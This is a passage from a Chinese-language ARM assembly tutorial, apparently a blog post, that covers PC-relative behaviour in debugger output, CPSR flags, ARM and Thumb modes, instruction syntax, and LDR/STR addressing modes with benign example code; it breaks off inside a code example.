#6</span><br><span class="line">      0x10068                  cmnvs  r5,  r0,  lsl #2</span><br><span class="line">-----------------------------------------------------------------[ threads ]----</span><br><span class="line">[#0] Id 1, Name: &quot;test_pc&quot;, stopped, reason: BREAKPOINT</span><br><span class="line">-------------------------------------------------------------------[ trace ]----</span><br><span class="line">[#0] 0x10054-&gt;Name: _start()</span><br><span class="line">-------------------------------------------------------------------------------- </span><br></pre></td></tr></table></figure>

<p>单步运行后：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">0x00010058 in _start ()</span><br><span class="line">--------------------------------------------------------------------------------------------------------------------------------------------------------------------[ registers ]----</span><br><span class="line">$r0   : 0x0001005c -&gt; &lt;_start+8&gt; add r2,  r1,  r1</span><br><span class="line">$r1   : 0x00000000</span><br><span class="line">$r2   : 0x00000000</span><br><span class="line">$r3   : 0x00000000</span><br><span class="line">$r4   : 0x00000000</span><br><span class="line">$r5   : 0x00000000</span><br><span class="line">$r6   : 0x00000000</span><br><span class="line">$r7   : 0x00000000</span><br><span class="line">$r8   : 0x00000000</span><br><span class="line">$r9   : 0x00000000</span><br><span class="line">$r10  : 0x00000000</span><br><span class="line">$r11  : 0x00000000</span><br><span class="line">$r12  : 0x00000000</span><br><span class="line">$sp   : 0xbefff3b0 -&gt; 0x00000001</span><br><span class="line">$lr   : 0x00000000</span><br><span class="line">$pc   : 0x00010058 -&gt; &lt;_start+4&gt; mov r1,  #2</span><br><span class="line">$cpsr : [thumb fast interrupt overflow carry zero negative]</span><br><span class="line">------------------------------------------------------------------------------------------------------------------------------------------------------------------------[ stack ]----</span><br><span class="line">0xbefff3b0|+0x00: 0x00000001    &lt;-$sp</span><br><span class="line">0xbefff3b4|+0x04: 0xbefff51c -&gt; &quot;/home/pi/asm/test_pc&quot;</span><br><span class="line">0xbefff3b8|+0x08: 0x00000000</span><br><span class="line">0xbefff3bc|+0x0c: 0xbefff531 -&gt; 0x49464e49</span><br><span class="line">0xbefff3c0|+0x10: 0xbefff56b -&gt; &quot;XDG_SESSION_ID=c2&quot;</span><br><span class="line">0xbefff3c4|+0x14: 0xbefff57d -&gt; &quot;SHELL=/bin/bash&quot;</span><br><span class="line">0xbefff3c8|+0x18: 0xbefff58d -&gt; &quot;TERM=xterm&quot;</span><br><span class="line">0xbefff3cc|+0x1c: 0xbefff598 -&gt; 0x49464e49</span><br><span class="line">------------------------------------------------------------------------------------------------------------------------------------------------------------------[ code:armv5t ]----</span><br><span class="line">      0x10040                  andeq  r0,  r1,  r0</span><br><span class="line">      0x10044                  andeq  r0,  r0,  r4,  rrx</span><br><span class="line">      0x10048                  andeq  r0,  r0,  r4,  rrx</span><br><span class="line">      0x1004c                  andeq  r0,  r0,  r5</span><br><span class="line">      0x10050                  andeq  r0,  r1,  r0</span><br><span class="line">      0x10054 &lt;_start+0&gt;       mov    r0,  pc</span><br><span class="line">-&gt;   0x10058 &lt;_start+4&gt;       mov    r1,  #2</span><br><span class="line">      0x1005c &lt;_start+8&gt;       add    r2,  r1,  r1</span><br><span class="line">      0x10060 &lt;_start+12&gt;      bkpt   0x0000</span><br><span class="line">      0x10064                  andeq  r1,  r0,  r1,  asr #6</span><br><span class="line">      0x10068                  cmnvs  r5,  r0,  lsl #2</span><br><span class="line">      0x1006c                  tsteq  r0,  r2,  ror #18</span><br><span class="line">----------------------------------------------------------------------------------------------------------------------------------------------------------------------[ threads ]----</span><br><span class="line">[#0] Id 1, Name: &quot;test_pc&quot;, stopped, reason: SINGLE STEP</span><br><span class="line">------------------------------------------------------------------------------------------------------------------------------------------------------------------------[ trace ]----</span><br><span class="line">[#0] 0x10058-&gt;Name: _start()</span><br><span class="line">-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------</span><br></pre></td></tr></table></figure>

<p>奇妙的事情发生了，查看R0中的地址。 虽然我们希望 R0 包含先前读取的 PC 值 (0x10054)，但它保存的是我们先前读取的 PC (0x1005c) 前两条指令的值。 从这个例子可以看出，当我们直接读取PC时，它遵循PC指向下一条指令的定义； 但在调试时，PC 指向当前 PC 值（0x10054 + 8 = 0x1005C）之前的两条指令。 这是因为较旧的 ARM 处理器总是在当前执行的指令之前获取两条指令。 ARM 保留此定义的原因是为了确保与早期处理器的兼容性。</p>
<h3 id="状态寄存器"><a href="#状态寄存器" class="headerlink" title="状态寄存器"></a>状态寄存器</h3><p>寄存器 $CPSR 显示当前程序状态寄存器 (CPSR) 的值，在其下方您可以看到标志拇指、快速中断、溢出、进位、零和负数。 这些标志代表 CPSR 寄存器中的某些位，根据 CPSR 的值设置，激活时变为1。 N、Z、C 和 V 位与 x86 上 EFLAG 寄存器中的 SF、ZF、CF 和 OF 位相同。 这些位用于在程序集级别支持条件和循环中的条件执行</p>
<table>
<thead>
<tr>
<th>N</th>
<th>Z</th>
<th>C</th>
<th>V</th>
<th>Q</th>
<th>-</th>
<th>J</th>
<th>-</th>
<th>GE</th>
<th>-</th>
<th>E</th>
<th>A</th>
<th>I</th>
<th>F</th>
<th>T</th>
<th>M</th>
</tr>
</thead>
<tbody><tr>
<td>Negative</td>
<td>Zero</td>
<td>Carry</td>
<td>Overflow</td>
<td>underflow</td>
<td></td>
<td>Jazelle</td>
<td></td>
<td>Greater than or Equal for SIMD</td>
<td></td>
<td>Endianness</td>
<td>Abort disable</td>
<td>IRQ disable</td>
<td>FIQ disable</td>
<td>Thumb</td>
<td>Processor mode(Privilege mode)</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>Flag</th>
<th>Description</th>
</tr>
</thead>
<tbody><tr>
<td>N(Negative)</td>
<td>如果指令结果是负数则置1.</td>
</tr>
<tr>
<td>Z(Zero)</td>
<td>如果指令结果产生零值则置1.</td>
</tr>
<tr>
<td>C(Carry)</td>
<td>如果指令的结果产生一个需要第 33 位才能完全表示的值，则置1.</td>
</tr>
<tr>
<td>V(Overflow)</td>
<td>如果该指令的结果产生不能在32位二进制补码表示的值.</td>
</tr>
<tr>
<td>E(Endian-bit)</td>
<td>ARM 可以以小端或大端方式运行。 对于小端模式，该位设置为 0，对于大端模式设置为 1.</td>
</tr>
<tr>
<td>T(Thumb-bit)</td>
<td>如果是Thumb模式置1，如果是ARM模式置0.</td>
</tr>
<tr>
<td>M(Mode-bits)</td>
<td>这些位指定当前特权模式（USR、SVC 等）.</td>
</tr>
<tr>
<td>J(Jazelle)</td>
<td>允许某些 ARM 处理器在硬件中执行 Java 字节码的第三种执行状态.</td>
</tr>
</tbody></table>
<p>APSR包含下列ALU的状态标志：</p>
<p>N-当操作结果为负数时设置；</p>
<p>Z-当操作结果为0时设置；</p>
<p>C-当操作导致进位时设置；</p>
<p>V-当操作造成溢出时设置。</p>
<p>在下列情况下，进位发生:</p>
<ol>
<li>如果加法的结果大于或等于 2^32，</li>
<li>如果减法的结果是正数或零，</li>
<li>作为move or logical指令中的内联桶形移位器操作的结果。</li>
</ol>
<p>如果加法、减法或比较的结果大于或等于 2^31，或小于 –2^31，溢出发生。</p>
<h2 id="Mode"><a href="#Mode" class="headerlink" title="Mode"></a>Mode</h2><p>ARM 处理器有两个主要的状态可以运行（这里不计算 Jazelle），ARM 和 Thumb。 这些状态与特权级别无关。 例如，在 SVC 模式下运行的代码可以是 ARM 或 Thumb。 这两种状态的主要区别在于指令集，其中ARM状态的指令总是32位的，Thumb状态的指令是16位的（但也可以是32位的）。 了解何时以及如何使用 Thumb 对于我们的 ARM 漏洞利用开发目的尤其重要。 在编写 ARM shellcode 时，我们需要去掉 NULL 字节，使用 16 位 Thumb 指令而不是 32 位 ARM 指令减少了拥有它们的机会。</p>
<p>这里有不同的Thumb版本：</p>
<ol>
<li>Thumb-1 (16-bit instructions): 在 ARMv6 and 更早的架构中使用.</li>
<li>Thumb-2 (16-bit and 32-bit instructions): 扩展了 Thumb-1 通过加了更多的指令并且允许它们可以是16bits和32bits(ARMv6T2, ARMv7).</li>
<li>ThumbEE: 包含了一些改变和添加使其能够动态的添加和生成代码（在执行之前或执行期间在设备上编译的代码）。</li>
</ol>
<p>ARM和Thumb之间的差别：</p>
<ol>
<li>条件执行，ARM状态下的所有的指令都支持条件执行，某些 ARM 处理器版本允许使用 IT 指令在 Thumb 中进行条件执行。 条件执行导致更高的代码密度，因为它减少了要执行的指令数量并减少分支预测的指令数量。</li>
<li>32位的ARM和Thumb指令：32位的Thumb指令有.w后缀。</li>
<li>桶形移位器是另一个独特的 ARM 模式功能。 它可用于将多条指令压缩为一条指令。例如，不使用两条指令进行乘法（将寄存器乘以 2 并使用 MOV 将结果存储到另一个寄存器中），您可以通过使用左移 1 -&gt; <code>Mov R1, R0, LSL #1</code> 将乘法包含在 MOV 指令中; <code>R1 = R0 * 2</code>.</li>
</ol>
<p>要切换处理器执行的状态，必须满足以下两个条件之一：</p>
<ol>
<li>我们可以使用分支指令BX (branch and exchange) or BLX (branch, link, and exchange) ，将目标寄存器的最低有效位设置为 1。这可以通过向偏移量加 1 来实现，例如 0x5530 + 1。您可能认为这会导致对齐问题，因为指令是 2 字节或 4 字节对齐的。 这不是问题，因为处理器将忽略最低有效位。</li>
<li>如果当前程序状态寄存器中的 T 位被设置，我们就知道我们处于 Thumb 模式。</li>
</ol>
<h3 id="Briefly-introduce-into-ARM-Instructions"><a href="#Briefly-introduce-into-ARM-Instructions" class="headerlink" title="Briefly introduce into ARM Instructions"></a>Briefly introduce into ARM Instructions</h3><p>汇编语言由作为主要构建块的指令组成。 ARM 指令通常后跟一两个操作数，一般使用以下模板：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MNEMONIC&#123;S&#125;&#123;condition&#125; &#123;Rd&#125;, Operand1, Operand2</span><br></pre></td></tr></table></figure>

<p>由于 ARM 指令集的灵活性，并非所有指令都使用模板中提供的所有字段。模板中字段的用途描述如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">MNEMONIC     - Short name (mnemonic) of the instruction</span><br><span class="line">&#123;S&#125;          - An optional suffix. If S is specified, the condition flags are updated on the result of the operation</span><br><span class="line">&#123;condition&#125;  - Condition that is needed to be met in order for the instruction to be executed</span><br><span class="line">&#123;Rd&#125;         - Register (destination) for storing the result of the instruction</span><br><span class="line">Operand1     - First operand. Either a register or an immediate value </span><br><span class="line">Operand2     - Second (flexible) operand. Can be an immediate value (number) or a register with an optional shift</span><br></pre></td></tr></table></figure>

<p>MNEMONIC、S、Rd 和 Operand1 字段是比较直观的，但条件和 Operand2 字段需要更多说明。 条件字段与 CPSR 寄存器的值密切相关，或者准确地说，是寄存器中特定位的值。 Operand2 被称为灵活操作数，因为我们可以以各种形式使用它——作为立即数（具有有限的值集）、寄存器或带有移位的寄存器。 例如，我们可以将这些表达式用作 Operand2：</p>
<figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#123                    - Immediate value (with limited set of values). </span></span><br><span class="line"><span class="symbol">Rx</span>                      - Register x (like <span class="built_in">R1</span>, <span class="built_in">R2</span>, <span class="built_in">R3</span> ...)</span><br><span class="line"><span class="symbol">Rx</span>, <span class="keyword">ASR</span> n               - Register x with arithmetic shift right by n bits (<span class="number">1</span> = n = <span class="number">32</span>)</span><br><span class="line"><span class="symbol">Rx</span>, <span class="keyword">LSL</span> n               - Register x with logical shift left by n bits (<span class="number">0</span> = n = <span class="number">31</span>)</span><br><span class="line"><span class="symbol">Rx</span>, <span class="keyword">LSR</span> n               - Register x with logical shift right by n bits (<span class="number">1</span> = n = <span class="number">32</span>)</span><br><span class="line"><span class="symbol">Rx</span>, <span class="keyword">ROR</span> n               - Register x with rotate right by n bits (<span class="number">1</span> = n = <span class="number">31</span>)</span><br><span class="line"><span class="symbol">Rx</span>, <span class="keyword">RRX</span>                 - Register x with rotate right by one bit, with extend</span><br></pre></td></tr></table></figure>

<p>不同种类的指令的例子如下所示：</p>
<figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ADD</span>   <span class="built_in">R0</span>, <span class="built_in">R1</span>, <span class="built_in">R2</span>         - <span class="keyword">Adds</span> contents of <span class="built_in">R1</span> (Operand1) <span class="keyword">and</span> <span class="built_in">R2</span> (Operand2 in a form of register) <span class="keyword">and</span> stores the result into <span class="built_in">R0</span> (Rd)</span><br><span class="line"><span class="keyword">ADD</span>   <span class="built_in">R0</span>, <span class="built_in">R1</span>, <span class="number">#2</span>         - <span class="keyword">Adds</span> contents of <span class="built_in">R1</span> (Operand1) <span class="keyword">and</span> the value <span class="number">2</span> (Operand2 in a form of an immediate value) <span class="keyword">and</span> stores the result into <span class="built_in">R0</span> (Rd)</span><br><span class="line"><span class="keyword">MOVLE</span> <span class="built_in">R0</span>, <span class="number">#5</span>             - Moves number <span class="number">5</span> (Operand2, because the compiler treats <span class="keyword">it</span> as <span class="keyword">MOVLE</span> <span class="built_in">R0</span>, <span class="built_in">R0</span>, <span class="number">#5</span>) to <span class="built_in">R0</span> (Rd) ONLY <span class="meta">if</span> the condition LE (Less Than or Equal) is satisfied</span><br><span class="line"><span class="keyword">MOV</span>   <span class="built_in">R0</span>, <span class="built_in">R1</span>, <span class="keyword">LSL</span> <span class="number">#1</span>     - Moves the contents of <span class="built_in">R1</span> (Operand2 in a form of register with logical shift left) shifted left by one bit to <span class="built_in">R0</span> (Rd). So <span class="meta">if</span> <span class="built_in">R1</span> had value <span class="number">2</span>, <span class="keyword">it</span> gets shifted left by one bit <span class="keyword">and</span> becomes <span class="number">4</span>. <span class="number">4</span> is then moved to <span class="built_in">R0</span>.</span><br></pre></td></tr></table></figure>

<p>总结下：</p>
<table>
<thead>
<tr>
<th>Instruction</th>
<th>Description</th>
<th>Instruction</th>
<th>Description</th>
</tr>
</thead>
<tbody><tr>
<td>MOV</td>
<td>Move data</td>
<td>EOR</td>
<td>Bitwise XOR</td>
</tr>
<tr>
<td>MVN</td>
<td>Move and negate</td>
<td>LDR</td>
<td>Load</td>
</tr>
<tr>
<td>ADD</td>
<td>Addition</td>
<td>STR</td>
<td>Store</td>
</tr>
<tr>
<td>SUB</td>
<td>Subtraction</td>
<td>LDM</td>
<td>Load Multiple</td>
</tr>
<tr>
<td>MUL</td>
<td>Multiplication</td>
<td>STM</td>
<td>Store Multiple</td>
</tr>
<tr>
<td>LSL</td>
<td>Logical Shift Left</td>
<td>PUSH</td>
<td>Push on Stack</td>
</tr>
<tr>
<td>LSR</td>
<td>Logical Shift Right</td>
<td>POP</td>
<td>Pop off Stack</td>
</tr>
<tr>
<td>ASR</td>
<td>Arithmetic Shift Right</td>
<td>B</td>
<td>Branch</td>
</tr>
<tr>
<td>ROR</td>
<td>Rotate Right</td>
<td>BL</td>
<td>Branch with Link</td>
</tr>
<tr>
<td>CMP</td>
<td>Compare</td>
<td>BX</td>
<td>Branch and eXchange</td>
</tr>
<tr>
<td>AND</td>
<td>Bitwise AND</td>
<td>BLX</td>
<td>Branch with Link and eXchange</td>
</tr>
<tr>
<td>ORR</td>
<td>Bitwise OR</td>
<td>SWI/SVC</td>
<td>System Call</td>
</tr>
</tbody></table>
<h2 id="load-and-store-Instruction"><a href="#load-and-store-Instruction" class="headerlink" title="load and store Instruction"></a>load and store Instruction</h2><p>ARM使用load-store模式进行内存的访问，这意味着只能使用load/store(LDR and LDR)指令能访问内存。而x86允许直接在内存上操作数据，在arm上数据在操作前必须被move到寄存器中。这意味着在 ARM 上的特定内存地址处递增 32 位值将需要三种类型的指令(load, increment, and store) 来首先将特定地址处的值加载到寄存器中，在寄存器中递增它，然后将它从寄存器存储回内存。为了解释 ARM 上加载和存储操作的基本原理，我们从一个基本示例开始，然后继续介绍三种基本偏移量形式，每种偏移量形式具有三种不同的地址模式。 对于每个示例，我们将使用具有不同 LDR/STR 偏移形式的同一段汇编代码，以保持简单。</p>
<p>立即数作为偏移：<br>地址模式: 偏移<br>地址模式: 预先索引<br>地址模式: 后索引<br>寄存器作为偏移:<br>地址模式: 偏移<br>地址模式: 预先索引<br>地址模式: 后索引<br>Scaled register作为偏移<br>地址模式: 偏移<br>地址模式: 预先索引<br>地址模式: 后索引</p>
<p>通常，LDR用于将内存中的某些内容加载到寄存器中，STR用于将存储器中的某些内容存储到内存地址。</p>
<figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">LDR</span> <span class="built_in">R2</span>, [<span class="built_in">R0</span>]   <span class="comment">@ [R0] - origin address is the value found in R0.</span></span><br><span class="line"><span class="keyword">STR</span> <span class="built_in">R2</span>, [<span class="built_in">R1</span>]   <span class="comment">@ [R1] - destination address is the value found in R1.</span></span><br></pre></td></tr></table></figure>

<p>LDR操作：将R0中找到的地址上的值加载到目标寄存器R2。</p>
<p>STR操作：将R2中找到的值存储到R1中找到的内存地址。</p>
<h3 id="example-1"><a href="#example-1" class="headerlink" title="example 1"></a>example 1</h3><figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.data</span>          <span class="comment">/* the .data section is dynamically created and its addresses cannot be easily predicted */</span></span><br><span class="line"><span class="symbol">var1:</span> <span class="meta">.word</span> <span class="number">3</span>  <span class="comment">/* variable 1 in memory */</span></span><br><span class="line"><span class="symbol">var2:</span> <span class="meta">.word</span> <span class="number">4</span>  <span class="comment">/* variable 2 in memory */</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">.text</span>          <span class="comment">/* start of the text (code) section */</span> </span><br><span class="line"><span class="symbol">.global</span> _start</span><br><span class="line"></span><br><span class="line"><span class="symbol">_start:</span></span><br><span class="line">    <span class="keyword">ldr</span> <span class="built_in">r0</span>, adr_var1  <span class="comment">@ load the memory address of var1 via label adr_var1 into R0 </span></span><br><span class="line">    <span class="keyword">ldr</span> <span class="built_in">r1</span>, adr_var2  <span class="comment">@ load the memory address of var2 via label adr_var2 into R1 </span></span><br><span class="line">    <span class="keyword">ldr</span> <span class="built_in">r2</span>, [<span class="built_in">r0</span>]      <span class="comment">@ load the value (0x03) at memory address found in R0 to register R2  </span></span><br><span class="line">    <span class="keyword">str</span> <span class="built_in">r2</span>, [<span class="built_in">r1</span>]      <span class="comment">@ store the value found in R2 (0x03) to the memory address found in R1 </span></span><br><span class="line">    <span class="keyword">bkpt</span>             </span><br><span class="line"></span><br><span class="line"><span class="symbol">adr_var1:</span> <span class="meta">.word</span> var1  <span class="comment">/* address to var1 stored here */</span></span><br><span class="line"><span class="symbol">adr_var2:</span> <span class="meta">.word</span> var2  <span class="comment">/* address to var2 stored here */</span></span><br></pre></td></tr></table></figure>

<p>在底部，我们有我们的 Literal Pool（同一代码段中的一个内存区域，用于存储其他人可以以与位置无关的方式引用的常量、字符串或偏移量），其中存储了 var1 和 var2 的内存地址（在顶部的数据部分）使用标签 adr_var1 和 adr_var2。第一个 LDR 将 var1 的地址加载到寄存器 R0 中。第二个 LDR 对 var2 执行相同的操作并将其加载到 R1。然后我们将存储在 R0 中找到的内存地址的值加载到 R2，并将 R2 中找到的值存储到 R1 中找到的内存地址。</p>
<p>当我们将某些内容加载到寄存器中时，方括号 ([ ]) 表示：在这些方括号之间的寄存器中找到的值是我们要从中加载某些内容的内存地址。</p>
<p>当我们将内容存储到内存位置时，方括号 ([]) 表示：在这些方括号之间的寄存器中找到的值是我们想要存储内容的内存地址。</p>
<p>调试器中的代码片段：</p>
<figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">-&gt;   <span class="number">0x10074</span> &lt;_start+<span class="number">0</span>&gt;       <span class="keyword">ldr</span>    <span class="built_in">r0</span>,  [<span class="built_in">pc</span>,  <span class="number">#12</span>]    <span class="comment">; 0x10088 &lt;adr_var1&gt;</span></span><br><span class="line">      <span class="number">0x10078</span> &lt;_start+<span class="number">4</span>&gt;       <span class="keyword">ldr</span>    <span class="built_in">r1</span>,  [<span class="built_in">pc</span>,  <span class="number">#12</span>]     <span class="number">0x1008c</span> &lt;adr_var2&gt;</span><br><span class="line">      <span class="number">0x1007c</span> &lt;_start+<span class="number">8</span>&gt;       <span class="keyword">ldr</span>    <span class="built_in">r2</span>,  [<span class="built_in">r0</span>]</span><br><span class="line">      <span class="number">0x10080</span> &lt;_start+<span class="number">12</span>&gt;      <span class="keyword">str</span>    <span class="built_in">r2</span>,  [<span class="built_in">r1</span>]</span><br><span class="line">      <span class="number">0x10084</span> &lt;_start+<span class="number">16</span>&gt;      <span class="keyword">bkpt</span>   <span class="number">0x0000</span></span><br><span class="line">      <span class="number">0x10088</span> &lt;adr_var1+<span class="number">0</span>&gt;     <span class="keyword">muleq</span>  <span class="built_in">r2</span>,  <span class="built_in">r0</span>,  <span class="built_in">r0</span></span><br><span class="line">----------------------------------------------------------------------------------------------------------------------------------------------------------------------[ threads ]----</span><br><span class="line">[<span class="number">#0</span>] Id <span class="number">1</span>, Name: <span class="string">&quot;test_pc&quot;</span>, stopped, reason: BREAKPOINT</span><br><span class="line">------------------------------------------------------------------------------------------------------------------------------------------------------------------------[ trace ]----</span><br><span class="line">[<span class="number">#0</span>] <span class="number">0x10074</span>-&gt;Name: _start()</span><br><span class="line">-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------</span><br><span class="line"><span class="symbol">gef</span>&gt; </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>我们在前两个 LDR 操作中指定的标签更改为 [pc, #12]。这称为 PC 相对寻址。因为我们使用了标签，所以编译器计算了我们在文字池 (PC+12) 中指定的值的位置。您可以使用这种精确方法自己计算位置，也可以像我们之前所做的那样使用标签。唯一的区别是，您需要计算您的值在 Literal Pool 中的确切位置，而不是使用标签。在这种情况下，它距离有效 PC 位置 3 跳（4+4+4=12）。</p>
<h4 id="立即数作为偏移"><a href="#立即数作为偏移" class="headerlink" title="立即数作为偏移"></a>立即数作为偏移</h4><figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">STR</span>    Ra, [Rb, imm]</span><br><span class="line"><span class="keyword">LDR</span>    Ra, [Rc, imm]</span><br></pre></td></tr></table></figure>

<p>这里我们使用立即数（整数）作为偏移量。 该值与基址寄存器（下例中的 R1）相加或相减，以在编译时已知的偏移量处访问数据。</p>
<figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.data</span></span><br><span class="line"><span class="symbol">var1:</span> <span class="meta">.word</span> <span class="number">3</span></span><br><span class="line"><span class="symbol">var2:</span> <span class="meta">.word</span> <span class="number">4</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">.text</span></span><br><span class="line"><span class="symbol">.global</span> _start</span><br><span class="line"></span><br><span class="line"><span class="symbol">_start:</span></span><br><span class="line">    <span class="keyword">ldr</span> <span class="built_in">r0</span>, adr_var1  <span class="comment">@ load the memory address of var1 via label adr_var1 into R0</span></span><br><span class="line">    <span class="keyword">ldr</span> <span class="built_in">r1</span>, adr_var2  <span class="comment">@ load the memory address of var2 via label adr_var2 into R1</span></span><br><span class="line">    <span class="keyword">ldr</span> <span class="built_in">r2</span>, [<span class="built_in">r0</span>]      <span class="comment">@ load the value (0x03) at memory address found in R0 to register R2 </span></span><br><span class="line">    <span class="keyword">str</span> <span class="built_in">r2</span>, [<span class="built_in">r1</span>, <span class="number">#2</span>]  <span class="comment">@ address mode: offset. Store the value found in R2 (0x03) to the memory address found in R1 plus 2. Base register (R1) unmodified. </span></span><br><span class="line">    <span class="keyword">str</span> <span class="built_in">r2</span>, [<span class="built_in">r1</span>, <span class="number">#4</span>]! <span class="comment">@ address mode: pre-indexed. Store the value found in R2 (0x03) to the memory address found in R1 plus 4. Base register (R1) modified: R1 = R1+4 </span></span><br><span class="line">    <span class="keyword">ldr</span> <span class="built_in">r3</span>, [<span class="built_in">r1</span>], <span class="number">#4</span>  <span class="comment">@ address mode: post-indexed. Load the value at memory address found in R1 to register R3. Base register (R1) modified: R1 = R1+4 </span></span><br><span class="line">    <span class="keyword">bkpt</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">adr_var1:</span> <span class="meta">.word</span> var1</span><br><span class="line"><span class="symbol">adr_var2:</span> <span class="meta">.word</span> var2</span><br></pre></td></tr></table></figure>

<p>将在偏移地址模式下执行 STR 操作的下一条指令。 它会将 R2 (0x00000003) 中的值存储到 R1 (0x0001009c) 中指定的内存地址 + 偏移量 (#2) = 0x1009e。</p>
<h4 id="寄存器作为偏移"><a href="#寄存器作为偏移" class="headerlink" title="寄存器作为偏移"></a>寄存器作为偏移</h4><figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">STR</span>    Ra, [Rb, Rc]</span><br><span class="line"><span class="keyword">LDR</span>    Ra, [Rb, Rc]</span><br></pre></td></tr></table></figure>

<p>这种偏移形式使用寄存器作为偏移。 这种偏移形式的一个示例用法是当您的代码想要访问在运行时计算索引的数组时。</p>
<figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.data</span></span><br><span class="line"><span class="symbol">var1:</span> <span class="meta">.word</span> <span class="number">3</span></span><br><span class="line"><span class="symbol">var2:</span> <span class="meta">.word</span> <span class="number">4</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">.text</span></span><br><span class="line"><span class="symbol">.global</span> _start</span><br><span class="line"></span><br><span class="line"><span class="symbol">_start:</span></span><br><span class="line">    <span class="keyword">ldr</span> <span class="built_in">r0</span>, adr_var1  <span class="comment">@ load the memory address of var1 via label adr_var1 to R0 </span></span><br><span class="line">    <span class="keyword">ldr</span> <span class="built_in">r1</span>, adr_var2  <span class="comment">@ load the memory address of var2 via label adr_var2 to R1 </span></span><br><span class="line">    <span class="keyword">ldr</span> <span class="built_in">r2</span>, [<span class="built_in">r0</span>]      <span class="comment">@ load the value (0x03) at memory address found in R0 to R2</span></span><br><span class="line">    <span class="keyword">str</span> <span class="built_in">r2</span>, [<span class="built_in">r1</span>, <span class="built_in">r2</span>]  <span class="comment">@ address mode: offset. Store the value found in R2 (0x03) to the memory address found in R1 with the offset R2 (0x03). Base register unmodified.   </span></span><br><span class="line">    <span class="keyword">str</span> <span class="built_in">r2</span>, [<span class="built_in">r1</span>, <span class="built_in">r2</span>]! <span class="comment">@ address mode: pre-indexed. Store value found in R2 (0x03) to the memory address found in R1 with the offset R2 (0x03). Base register modified: R1 = R1+R2. </span></span><br><span class="line">    <span class="keyword">ldr</span> <span class="built_in">r3</span>, [<span class="built_in">r1</span>], <span class="built_in">r2</span>  <span class="comment">@ address mode: post-indexed. Load value at memory address found in R1 to register R3. Then modify base register: R1 = R1+R2.</span></span><br><span class="line">    <span class="keyword">bx</span> <span class="built_in">lr</span></span><br><span class="line"></span><br><span 